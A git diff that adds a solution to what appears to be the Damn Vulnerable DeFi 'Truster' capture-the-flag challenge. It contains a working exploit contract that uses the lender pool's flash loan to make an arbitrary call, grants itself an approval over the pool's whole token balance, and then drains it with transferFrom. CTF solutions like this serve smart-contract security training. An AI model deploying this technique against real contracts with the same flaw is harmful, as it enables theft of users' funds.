@@ -50,8 +50,11 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_truster() public checkSolvedByPlayer {
-        
+    function test_truster() public 
+    checkSolvedByPlayer 
+    {
+        // the constructor of the contract has the attack logic. Also the deploy is a single tx
+        new Attacker(pool, recovery, token);
     }
 
     /**
@@ -64,5 +67,19 @@ contract TrusterChallenge is Test {
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract Attacker {
+    constructor(TrusterLenderPool pool, address recovery, DamnValuableToken token) {
+        // 1. Prepare token approve data 
+        bytes4 selector = bytes4(keccak256(bytes("approve(address,uint256)")));
+        bytes memory data = abi.encodeWithSelector(selector, address(this), token.balanceOf(address(pool)));
+
+        // 2. Call flashloan to execute the approve
+        pool.flashLoan(0, address(this), address(token), data); // notice: 0 as amount to not modify the pool's balance and receiver could be any address
+
+        // 4. execute transferFrom to recover the funds 
+        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
     }
 }
